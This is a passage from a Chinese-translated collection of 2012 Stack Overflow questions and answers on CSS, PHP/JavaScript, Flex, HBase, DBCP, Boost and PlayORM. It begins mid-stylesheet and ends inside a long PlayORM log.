    height:196px;
}
.teachings{
    height:196px;
}
.getInvolved{
            height:196px;
        } 
        #menu-wrapper{
            width: 960px;
            height: 48px;
            background: url(../images/bg-decor-line01.png);
            margin-bottom: 29px;
        }
        #menu {  
            list-style:none;  
            width:940px;  
            padding: 0 0 0 10px;
            margin: 0 0 0 5px;
            height:43px;  
            overflow: visible;
        } 

        #menu li {  
            float:left;  
            display:block;   
            padding: 4px 30px 9px -1px;  
            margin: 4px 0 0 0;  
            border:none;  
            z-index:7;
        }

        #menu li:hover{
            background-color:#E7E7E7;
        }

        #dropdown-wrapper{
            width:960px;
            background: url(../images/bg-decor-line01.png); 
            left:-5px; top:48px;
        } 
```

如何让菜单正确排列？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:10:02.360

删除以下代码段`ie.css`

```
.block li {
    position:relative;
} 
```

我刚刚做了一个现场编辑，它似乎得到了修复。

# php - php mysql_query里面的javascript确认

> ID：13076116
> 
> 赞同：-3
> 
> 时间：2012-10-25T19:50:09.990
> 
> 标签：php, javascript, mysql, confirmation

我有一个由表单调用的 PHP 文件，其中的 javascript 代码无法正常工作。

```
<?php
  $var1 = $_POST['var1'];
  if($var1==1){
  ?>
    <script>
    if(confirmation('Some text')){ 
    <?                 
      mysql_query('update table set ...'); 
    ?>             
    }else{
      alert('error');
    }
    </script> 
  <?
  }
?> 
```

发生的情况是，即使我在确认窗口上点击取消，mysql 查询也会执行。if($var==1) 指令只是作为演示。在 javascript 代码之前我有几个 ifs 和 mysql 指令。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T19:52:58.867

PHP 是一种`server-side`语言，它在`client-side`Javascript 执行之前执行。因此，它仅在 PHP 脚本运行后处理条件检查。您需要`AJAX`用于此类目的。

# apache-flex - Flex spark TextArea 限制复制/粘贴时的最大字符数

> ID：13076119
> 
> 赞同：0
> 
> 时间：2012-10-25T19:50:26.463
> 
> 标签：apache-flex, textarea, max, flex-spark

我进行了搜索，但无法找到它。我们有一个 maxChars="3900" 的 Spark TextArea。但是当复制/粘贴到文本区域时它不起作用。我试图将其添加到 changeHandler 中：

```
 if (ta.text.length > 3900)
        {
                        Alert.show("The maximum characters length is 3900\. Please limit the characters to the max limit");
                        ta.text = ta.text.substr(0, 3900);
                    } else 
                    {
                        if (event.operation is PasteOperation)
                        {
....//Other logic
                        }
       } 
```

问题是它并不总是有效。警报仅在超过 3900 个字符时才会显示。不知道为什么。我也将相同的内容添加到 changeHandler 中。但这根本不会被触发。

请让我知道我错过了什么。每次超过最大限制时，我都需要显示警报并将字符修剪到最大值。

谢谢

哈里什

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T03:53:02.310

首先，我们需要明确一件事：当更改处理程序被触发时，这意味着：文本正在更改，但更改尚未应用。

如果您的 textare 中的文本是“”（空），现在，我粘贴 1600 个字符，调用更改处理程序，文本的长度仍然为 0，因为它正在更改，而不是更改。

所以现在，如果你有一个更改处理程序，当你跟踪长度时，它应该是 1600。

但是，如果你使用“event.preventDefault();” 在您的更改方法中，并且不更改更改处理程序中的文本，则不应触发更改处理程序。

所以，我的建议是：

1.  使用更改处理程序是正确的。
2.  在处理程序中，获取剪贴板中的文本，然后您**可以获得剪贴板中文本的长度，使用此长度 + textArea.text.length**，您将获得粘贴处理后的长度。如果总长度大于您的限制，您可以阻止该事件，并做任何您想做的事情。

这是给你的一些代码：

```
protected function textArea_changingHandler(event:TextOperationEvent):void
        {
            trace(event.type + " - " + textArea.text.length); //  this length is befor the paste

            if(event.operation is PasteOperation) {
                // Text in the clipboard.
                var textPaste:String = Clipboard.generalClipboard.getData(ClipboardFormats.TEXT_FORMAT) == null ? "" : Clipboard.generalClipboard.getData(ClipboardFormats.TEXT_FORMAT) as String; 
                // this length is after the paste(if the paste will complete)
                var totalLength:int = textArea.text.length + textPaste.length; 
                trace("String length after Paste: " + totalLength);

                if(totalLength > 3900) {
                    event.preventDefault();
                    textArea.text += "[Paste:" + textPaste.substr(0, 2) + "]"; // process your text here. 
                }
            }
        } 
```

# css - 媒体查询和百分比宽度导致 webkit 浏览器上奇怪的 IMG 收缩行为

> ID：13076120
> 
> 赞同：1
> 
> 时间：2012-10-25T19:50:28.790
> 
> 标签：css, webkit, responsive-design, media-queries

如果将以下网页代码加载到 Chrome（和智能手机）中，每次视口越过 440px 断点时，img 都会出现非常奇怪的收缩行为。您可以通过反复调整 Chrome 浏览器的大小来复制该问题，然后再将其宽度调整为大于 440 像素，或者在智能手机上通过在纵向和横向之间来回切换来复制该问题。当您多次执行此操作直到图像变得如此之小以至于几乎消失时，这实际上非常有趣！哈哈！

任何人都知道是什么导致了这种奇怪的行为以及解决方法？值得注意的是，它不会在 FireFox 中发生。

```
<!doctype html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
  <style>
    #supported-payment-options li {
      float:left;
      list-style:none;
    }
    @media (max-width: 679px) {
      img.retina-zoom { width:75%; }
    }
    @media (max-width: 440px) {
    }
  </style>
</head>
<body>

<ul id="supported-payment-options">
    <li><img class="retina-zoom" src="https://si0.twimg.com/profile_images/1695501054/book-responsive_reasonably_small.gif"></li>
</ul>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T19:56:46.807

哈！，这是一个有趣的效果。要修复它，请使用`max-width`而不是`width`：

```
@media (max-width: 679px) {
  img.retina-zoom { max-width:75%; }
} 
```

**编辑：**请注意，这不会发生在最新的[Webkit Nightly](http://nightly.webkit.org/)中，所以也许这是一个已修复的错误。

# java - 如何使用 Java 连接到 localhost HBase

> ID：13076121
> 
> 赞同：2
> 
> 时间：2012-10-25T19:50:29.880
> 
> 标签：java, connection, hbase

当我以嵌入式方式启动 HBase 时，它​​可以完美运行。

我在 Ubuntu 12.04 上，我通过下载 tar.gz 并在 opt 目录上解压缩安装了 hbase 0.90.5。

HBase 已正确启动，在日志中没有崩溃也没有异常，因此似乎 HBase 已正确安装。hbase-site.xml 很简单：

```
<configuration>
<property>
    <name>hbase.zookeeper.quorum</name>
    <value>localhost</value>
</property>

<property>
    <name>hbase.zookeeper.property.clientPort</name>
    <value>2181</value>
</property> 
```

然后我的 etc/hosts 文件就更简单了：

```
127.0.0.1 localhost

127.0.0.1 alex-desktop 
```

请注意，我已经阅读了有关从此文件中删除主机名的信息，但是这样做只会在启动 hbase 时导致错误。所以我决定离开这里。

最后是我的 Java 代码：

```
Configuration config = HBaseConfiguration.create();
    config.clear();
    config.set("hbase.zookeeper.quorum", "localhost");
    config.set("hbase.zookeeper.property.clientPort","2181");
    config.set("hbase.master", "localhost:60000"); 
```

我在日志中得到异常：

```
2/10/25 21:41:59 INFO zookeeper.ClientCnxn: Session establishment complete on server localhost/127.0.0.1:2181, sessionid = 0x13a996f3e1d000b, negotiated timeout = 40000

12/10/25 21:41:59 INFO client.HConnectionManager$HConnectionImplementation: getMaster attempt 0 of 1 failed; no more retrying.
java.io.IOException: Call to localhost/127.0.0.1:60001 failed on local exception: java.io.EOFException at org.apache.hadoop.hbase.ipc.HBaseClient.wrapException(HBaseClient.java:954)
at org.apache.hadoop.hbase.ipc.HBaseClient.call(HBaseClient.java:923)
at org.apache.hadoop.hbase.ipc.WritableRpcEngine$Invoker.invoke(WritableRpcEngine.java:150)
at $Proxy6.getProtocolVersion(Unknown Source)
at org.apache.hadoop.hbase.ipc.WritableRpcEngine.getProxy(WritableRpcEngine.java:183) 
```

请注意，端口 60001 会发生变化，有时是此端口，但也可以是其他任何端口，例如 46666。

我也尝试过导出导出`HBASE_MANAGES_ZK=true`，但没有帮助。我不知道接下来我能做什么，因为我不知道这个随机端口是什么。

有谁知道发生了什么？

非常感谢您提前。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T22:59:25.193

确保您`same`在客户端代码中使用 HBase 版本，就像在集群中一样。一般情况下`EOFException`会出现版本不匹配的情况。

# java - 具有执行程序或多线程环境的 Apache DBCP

> ID：13076124
> 
> 赞同：1
> 
> 时间：2012-10-25T19:50:35.417
> 
> 标签：java, multithreading, spring, executorservice, apache-commons-dbcp

我的 services.xml 中有以下代码

```
<bean id="executorService" class="java.util.concurrent.Executors" factory-method="newFixedThreadPool">
    <constructor-arg value="10" />
</bean>
<task:annotation-driven executor="executor" />

<task:executor id="executor" pool-size="10" queue-capacity="100" rejection-policy="CALLER_RUNS" /> 
```

在同一个项目中，我还连接到使用 dbcp.BasicDataSource 的数据库。

我读过 DBCP 在您的应用程序是单线程而不是多线程时最有效。executor 的使用告诉我该应用程序是多线程的。你觉得这里使用 DBCP 不合适吗？这是一个好习惯吗？或者，我是否生活在一个古老的神话中，即 DBCP 无法处理多线程环境？

任何正确方向的指导将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:00:31.813

> 我读过 DBCP 在您的应用程序是单线程而不是多线程时最有效。

你能提供这些信息的来源吗？DBCP 唯一的问题是它使用单个锁来同步池上的所有操作，这可能成为重型多线程应用程序的瓶颈。

> DBCP 不能处理多线程环境？

想想看。如果您的应用程序只是单线程的，它永远不会使用多个连接。JDBC 是阻塞的，因此您不能同时使用来自同一个线程的两个连接（简化）。话虽这么说，如果您只从一个线程查询数据库，那么您不仅不需要连接池，而且不需要`DataSource`. 一个`Connection`就够了。

所以......我们主要在多线程应用程序中使用连接池，特别是在线程数量远大于可用连接数量并且线程之间相互竞争的情况下。每个健全的连接池都能够在多线程环境中工作。

# javascript - 如何在使用 Javascript 附加到 DOM 的元素上触发 CSS3 转换？

> ID：13076125
> 
> 赞同：2
> 
> 时间：2012-10-25T19:50:35.167
> 
> 标签：javascript, jquery, css, transition

我正在使用 javascript 构建甘特图样式的日程表视图，并试图让我的约会从左侧过渡到*绝对*定位的*内联*值。我想使用 CSS3 过渡来处理这个问题。

个人约会是通过 javascript 添加和绘制的，在标记中看起来像这样；

```
<div class="appt" style="width: 12.5%; left: 32.5874%;"></div> 
```

.appt 类具有`-webkit-transition: all .3s ease-in;`with`top: 0; left: 0`声明。

我认为当这些约会被附加到 DOM 时，它们会为它们的内联样式位置设置动画。我怎样才能做到这一点？

这是一个相关的简单示例。[http://codepen.io/aaronlsilber/pen/ocqFl](http://codepen.io/aaronlsilber/pen/ocqFl)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:01:36.370

在追加之前通过设置触发 CSS 转换`left: 0`，然后在追加发生后通过 .css() jQuery 函数更改内联 CSS。

例子：

```
$('<div class="appt" style="width: 12.5%; left: 32.5874%;"></div>').appendTo(/*ELEMENT*/);

$('.appt').css('left', '32.5874%'); 
```

**警告**：并非每个浏览器都支持 CSS 转换（例如 IE9），如果这种效果对于您的用户体验来说是必须的，我建议使用 jQuery .animate()

[http://api.jquery.com/animate/](http://api.jquery.com/animate/)

# php - 当输出达到 10 时，使用 PHP 和 MYSQL 如何在表中创建新列？

> ID：13076128
> 
> 赞同：-2
> 
> 时间：2012-10-25T19:50:39.380
> 
> 标签：php, mysql, loops, while-loop, increment

我正在使用从 mysql 数据库收集数据的 PHP 数组。我在一个表中输出这个信息，但是这个表太长了，因为我喜欢数据库中的所有条目。由于它输出大约 20 个列表，并且只有 10 个可以很好地放入表格中而无需滚动，

我将如何编写我的 PHP 以输出 10 个数据库行（该表已经在一个 while 循环中），每个都在自己的列表中但是当它达到 10 时，在第一个旁边创建一个新列，然后输出下一个10？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:24:10.817

1.  进行查询。
2.  计算结果。[IE。30]
3.  除以要显示的最大行数。[IE。10]
4.  编写一个外部`for`循环来写入行。[IE。从1到10]
5.  编写一个内部`for`循环来写入单元格。[IE。从1到3]

# c++ - 在 Mac OS X 上使用不同的编译器构建 boost

> ID：13076131
> 
> 赞同：1
> 
> 时间：2012-10-25T19:50:50.597
> 
> 标签：c++, boost, qt-creator, qmake

我试图弄清楚如何在 Mac OS X上使用与Apple 自己**不同的编译器构建 boost C++ 库。**

我的计算机上同时安装了 Xcode 4.5（带有命令行开发工具）和 QT Creator，这意味着当我发出 bootstrap.sh 和 b2 时，系统将使用默认的 Apple 编译器。

我相信我需要对我的环境变量进行一些配置，但我不知道我应该作为工具集传递什么（因为 qmake 似乎不是列出的选项之一）。

这就是我现在在 Apple 的编译器中使用 b2 的方式：

```
./b2 link=static threading=multi toolset=darwin architecture=x86 target-os=darwin address-model=32_64 stage 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T22:09:06.880

你不能用 qmake 构建任何东西，因为 qmake 是 Makefile 生成器，而不是编译器。您必须使用 GCC 或其他编译器来编译 Boost，然后将其添加到要链接的 qmake 项目文件中。

# playorm - 发现返回错误的结果

> ID：13076132
> 
> 赞同：0
> 
> 时间：2012-10-25T19:50:50.420
> 
> 标签：playorm

我有以下映射实体。

```
@NoSqlEntity
@NoSqlQueries({
        @NoSqlQuery(name = "findByName", query = "select u from TABLE as u where :name = u.name"),
        @NoSqlQuery(name = "findById", query = "select u from TABLE as u where :id = u.id"),
        @NoSqlQuery(name = "findByCpf", query = "select u from TABLE as u where :cpf = u.cpf"),
        @NoSqlQuery(name = "findAllUserIds", query = "select u from TABLE as u ") })
public class User {

    @NoSqlId
    @NoSqlIndexed
    @Field
    private String id;
    @NoSqlIndexed
    @Field
    private String cpf;
    @NoSqlEmbedded
    @Field
    private List<String> urls = new ArrayList<String>();
    @NoSqlIndexed
    @Field
    private String name;
    @Field
    private Long facebookId; 
```

然后我使用 find 方法如下：

```
Iterable<KeyValue<User>> iterable = UserDao.get().findAllUserIds();
        for (KeyValue<User> kv : iterable) {
            System.out.println("indexing user " + kv.getKey());
            IndexManager.get().updateIndex(kv.getValue());
        } 
```

我的数据库中有 5 个用户，但这仅返回 3 个结果。我做错了什么，还是我发现了一个错误？下面我列出了存储在 cassandra 中的数据和这个 sysout 的输出。

存储在 cassandra 中的数据：

```
[default@dmp] list User;
Using default limit of 100
Using default column limit of 100
-------------------
RowKey: 12656382709:devel-PowerEdge-1850
=> (column=cpf, value=, timestamp=1351175983356001)
=> (column=facebookId, value=, timestamp=1351175983356001)
=> (column=name, value=6a6f616f, timestamp=1351175983356001)
-------------------
RowKey: 1
=> (column=cpf, value=, timestamp=1351175983442001)
=> (column=facebookId, value=, timestamp=1351175983442001)
=> (column=name, value=, timestamp=1351175983442001)
=> (column=publisherIds1, value=, timestamp=1351175983442001)
=> (column=publisherIds2, value=, timestamp=1351175983442001)
=> (column=publisherIds3, value=, timestamp=1351175983442001)
-------------------
RowKey: 25d3e5cd-7c30-4a56-8ad5-32642fd670a1
=> (column=cpf, value=323932383232393839383938, timestamp=1350583912807001)
=> (column=facebookId, value=536a, timestamp=1350583912807001)
=> (column=name, value=6a6f7365, timestamp=1350583912807001)
-------------------
RowKey: 12064304627:devel-PowerEdge-1850
=> (column=cpf, value=, timestamp=1350583912594001)
=> (column=facebookId, value=, timestamp=1350583912594001)
=> (column=name, value=6a6f616f, timestamp=1350583912594001)
-------------------
RowKey: 5a353a6f-62cc-4fd3-a58b-8ee1cc01bed3
=> (column=cpf, value=323932383232393839383938, timestamp=1351175983602001)
=> (column=facebookId, value=536a, timestamp=1351175983602001)
=> (column=name, value=6a6f7365, timestamp=1351175983602001)

5 Rows Returned.
Elapsed time: 335 msec(s).
[default@dmp] 
```

日志输出：

```
...
INFO: On keyspace=dmpExisting column families=[inheritancetoone, partsecurity, forset, timeseriesdata, inheritancetoonespecific, stringindice, aapartitionedtrade, entitywithintkey, forcollection, entitywithdatetimekey, dbodatabasemeta, inheritancetomany, inheritancesuper, partitionedsingletrade, request, dbocolumnmeta, decimalindice, someentity, account, userplayorm, partaccount, integerindice, user, activity, dbotablemeta]
NOTE: WE WILL CREATE new column families automatically as you save entites that have no column family
...
INFO: [DboTableMeta]parsing query=findAll query=SELECT t FROM TABLE as t
2012-10-25 17:43:56,853 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl setupQueryStuff
INFO: [DboTableMeta]parsing query=findLike query=SELECT t FROM TABLE as t WHERE t.columnFamily >= :prefix and t.columnFamily < :modifiedPrefix
2012-10-25 17:43:56,864 com.alvazan.orm.parser.antlr.Optimizer optimizeGtLtToBetween
INFO: optimizing query tree for varname=t.columnFamily
2012-10-25 17:43:56,869 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl setupQueryStuff
INFO: [User]parsing query=findByName query=select u from TABLE as u where :name = u.name
2012-10-25 17:43:56,874 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl setupQueryStuff
INFO: [User]parsing query=findById query=select u from TABLE as u where :id = u.id
2012-10-25 17:43:56,875 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl setupQueryStuff
INFO: [User]parsing query=findByCpf query=select u from TABLE as u where :cpf = u.cpf
2012-10-25 17:43:56,877 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl setupQueryStuff
INFO: [User]parsing query=findAllUserIds query=select u from TABLE as u 
2012-10-25 17:43:56,877 com.alvazan.orm.layer0.base.BaseEntityManagerFactoryImpl rescan
INFO: Finished scanning classes, saving meta data
2012-10-25 17:43:56,883 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Column family NOT found in-memory=DboDatabaseMeta, CHECK and LOAD from Cassandra if available
2012-10-25 17:43:56,884 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: looking up meta=DboDatabaseMeta so we can add table to memory(one time operation)
2012-10-25 17:43:56,884 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper loadFromInMemoryOrDb
INFO: found meta=DboDatabaseMeta locally
2012-10-25 17:43:56,884 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyImpl
INFO: Virt CF=DboDatabaseMeta already exists and real colfamily=DboDatabaseMeta already exists so return it
2012-10-25 17:43:56,885 com.alvazan.orm.layer9z.spi.db.cassandra.ColumnFamilyHelper tryToLoadColumnFamilyVirt
INFO: Total time to LOAD column family meta from cassandra=2
2012-10-25 17:43:57,052 com.alvazan.orm.logging.LogBatchFetch logInfo
INFO: [rawlogger]CF=[tablename=DboDatabaseMeta] Find took=164 ms for batchSize=500 numFetched=1
2012-10-25 17:43:57,107 com.alvazan.orm.layer5.nosql.cache.NoSqlReadCacheImpl fromCache
INFO: cache hit(need to optimize this even further)
2012-10-25 17:43:57,161 com.alvazan.orm.logging.NoSqlRawLogger logInformationImpl
INFO: [rawlogger] Data being flushed to database in one go=
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:requests]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=requests,to pk=User:requests]
CF=[tablename=DboColumnMeta] persist rowkey=User:requests
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:publisherIds]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=publisherIds,to pk=User:publisherIds]
CF=[tablename=DboColumnMeta] persist rowkey=User:publisherIds
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:urls]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=urls,to pk=User:urls]
CF=[tablename=DboColumnMeta] persist rowkey=User:urls
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:name]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=name,to pk=User:name]
CF=[tablename=DboColumnMeta] persist rowkey=User:name
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:facebookId]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=facebookId,to pk=User:facebookId]
CF=[tablename=DboColumnMeta] persist rowkey=User:facebookId
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:cpf]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=cpf,to pk=User:cpf]
CF=[tablename=DboColumnMeta] persist rowkey=User:cpf
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:activitiesCursor]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=activitiesCursor,to pk=User:activitiesCursor]
CF=[tablename=DboColumnMeta] persist rowkey=User:activitiesCursor
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=User,to pk=User:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=User:id]
CF=[tablename=DboColumnMeta] persist rowkey=User:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=User
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=Request,to pk=Request:user]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=user,to pk=Request:user]
CF=[tablename=DboColumnMeta] persist rowkey=Request:user
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=Request,to pk=Request:jSon]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=jSon,to pk=Request:jSon]
CF=[tablename=DboColumnMeta] persist rowkey=Request:jSon
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=Request,to pk=Request:strDate]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=strDate,to pk=Request:strDate]
CF=[tablename=DboColumnMeta] persist rowkey=Request:strDate
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=Request,to pk=Request:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=Request:id]
CF=[tablename=DboColumnMeta] persist rowkey=Request:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=Request
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:collectionType]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=collectionType,to pk=DboColumnMeta:collectionType]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:collectionType
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:columnValueType]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=columnValueType,to pk=DboColumnMeta:columnValueType]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:columnValueType
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:itemType]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=itemType,to pk=DboColumnMeta:itemType]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:itemType
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:fkToColumnFamily]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=fkToColumnFamily,to pk=DboColumnMeta:fkToColumnFamily]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:fkToColumnFamily
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:owner]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=owner,to pk=DboColumnMeta:owner]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:owner
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:isPartitionedByThisColumn]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=isPartitionedByThisColumn,to pk=DboColumnMeta:isPartitionedByThisColumn]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:isPartitionedByThisColumn
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:columnName]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=columnName,to pk=DboColumnMeta:columnName]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:columnName
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:isIndexed]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=isIndexed,to pk=DboColumnMeta:isIndexed]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:isIndexed
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:isSeparateRow]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=isSeparateRow,to pk=DboColumnMeta:isSeparateRow]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:isSeparateRow
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:foreignKeyToExtensions]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=foreignKeyToExtensions,to pk=DboColumnMeta:foreignKeyToExtensions]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:foreignKeyToExtensions
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboColumnMeta,to pk=DboColumnMeta:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=DboColumnMeta:id]
CF=[tablename=DboColumnMeta] persist rowkey=DboColumnMeta:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=DboColumnMeta
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=RequestStru,to pk=RequestStru:user]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=user,to pk=RequestStru:user]
CF=[tablename=DboColumnMeta] persist rowkey=RequestStru:user
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=RequestStru,to pk=RequestStru:jSon]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=jSon,to pk=RequestStru:jSon]
CF=[tablename=DboColumnMeta] persist rowkey=RequestStru:jSon
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=RequestStru,to pk=RequestStru:strDate]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=strDate,to pk=RequestStru:strDate]
CF=[tablename=DboColumnMeta] persist rowkey=RequestStru:strDate
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=RequestStru,to pk=RequestStru:id]
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/columnName][indexval=id,to pk=RequestStru:id]
CF=[tablename=DboColumnMeta] persist rowkey=RequestStru:id
CF=DboTableMeta index persist(cf=[tablename=DboTableMeta])=[rowkey=/DboTableMeta/columnFamily] (table found, colmeta not found)
CF=[tablename=DboTableMeta] persist rowkey=RequestStru
CF=DboColumnMeta index persist(cf=[tablename=DboColumnMeta])=[rowkey=/DboColumnMeta/owner][indexval=DboTableMeta,to pk=DboTableMeta:nameToField]
